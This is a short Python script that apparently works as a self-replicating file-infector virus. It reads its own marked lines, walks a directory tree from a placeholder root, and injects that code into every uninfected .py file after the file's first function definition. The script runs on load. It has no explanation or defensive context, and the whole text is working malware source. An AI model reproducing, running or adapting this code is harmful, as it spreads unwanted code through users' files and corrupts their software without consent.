def run():
	#GKLWXaU
	import os,fnmatch,sys

	payload = []

	with open(sys.argv[0]) as file:
		lines = file.readlines()

	readingPayload = False

	for line in lines:
		if '#GKLWXaU' in line and '#asdf' not in line: #asdf
			if readingPayload:
				readingPayload = False
			else:
				readingPayload = True
		if readingPayload:
			payload.append(line)

	payload.append('\n#GKLWXaU\n') #asdf

	results = []
	for root, dirs, files in os.walk('/CHANGE ME TO ROOT'):
		for name in files:
			if fnmatch.fnmatch(name, '*.py'):
				results.append(os.path.join(root, name))

	contents = []

	for result in results:
		with open(result) as file:
			lines = file.readlines()

		infected = False

		for line in lines:
			if '#GKLWXaU' in line: #asdf
				infected = True

		if infected:
			continue

		contents = []

		injectPayload = True

		for line in lines:
			contents.append(line)
			if injectPayload and 'def ' in line and '):' in line:
				index = line.index('def ')
				prefix = line[0:index]
				for payloadLine in payload:
					contents.append(prefix + payloadLine)
				injectPayload = False
		
		with open(result, mode='w') as file:
			for line in contents:
					file.write(line)
	#GKLWXaU

run()
